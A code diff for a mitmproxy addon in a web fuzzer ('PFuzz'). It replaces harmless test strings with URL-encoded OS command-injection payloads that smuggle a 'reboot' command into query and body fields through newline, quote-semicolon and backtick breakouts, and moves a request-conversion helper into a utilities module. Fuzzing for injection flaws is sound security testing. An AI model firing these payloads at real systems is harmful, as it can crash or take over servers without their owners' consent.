@@ -1,18 +1,35 @@
 from mitmproxy import ctx
 from mitmproxy import http
 
+from PFuzz.Utils import PFuzzMitmReqToRequest
 from PFuzz.Config import PFuzzConfig
 from PFuzz.PFuzzManagerClient import PFuzzManagerClient
+from urllib.parse import quote
 
 import requests
 
+# console.view.eventlog
 # PFuzz XML RPC Connection
 PFuzzConn = PFuzzManagerClient()
 
-query_payloads = {'a':['hello','world'],'xxxx':[]}
-header_payloads = {'user-agenta':['chrome','safari'],'accept':['text','json']}
-body_payloads = ["reboot",'echo']
+rce_payload = 'reboot'
 
+# query_payloads = ['\n{}\n'.format(rce_payload),'";{};echo"'.format(rce_payload),'"\n{}\necho"'.format(rce_payload),
+#                     '";{};echo"'.format(rce_payload),'";{};echo"'.format(rce_payload),
+#                     '`{}`'.format(rce_payload)]
+# header_payloads = {}
+# body_payloads = ['\n{}\n'.format(rce_payload),'";{};echo"'.format(rce_payload),'"\n{}\necho"'.format(rce_payload),
+#                     '";{};echo"'.format(rce_payload),'";{};echo"'.format(rce_payload),
+#                     '`{}`'.format(rce_payload)]
+
+
+query_payloads = [quote('\n{}\n'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),quote('"\n{}\necho"'.format(rce_payload)),
+                    quote('";{};echo"'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),
+                    quote('`{}`'.format(rce_payload))]
+header_payloads = {}
+body_payloads = [quote('\n{}\n'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),quote('"\n{}\necho"'.format(rce_payload)),
+                    quote('";{};echo"'.format(rce_payload)),quote('";{};echo"'.format(rce_payload)),
+                    quote('`{}`'.format(rce_payload))]
 
 
 RuntimeFuzzConfig = {
@@ -23,26 +40,6 @@ RuntimeFuzzConfig = {
         PFuzzConfig.BODY_FUZZ_ARGS:body_payloads
     }
 }
-
-def PFuzzMitmReqToRequest(req:http.Request):
-    # build Request from mitmproxy request
-    try:
-        # our request url will not contain query string
-        url = req.path[:req.path.index('?')]
-    except:
-        url = req.path
-    
-    
-    method = req.method
-    params = dict()
-    for key,value in req.query.items():
-        params[key] = value
-    data = req.content.decode(PFuzzConfig.HTTP_ENCODE_TYPE)
-    headers = dict()
-    for key,value in req.headers.items():
-        headers[key.lower()] = value
-    
-    return requests.Request(method=method,url=url,params=params,headers=headers,data=data)
 
 
 
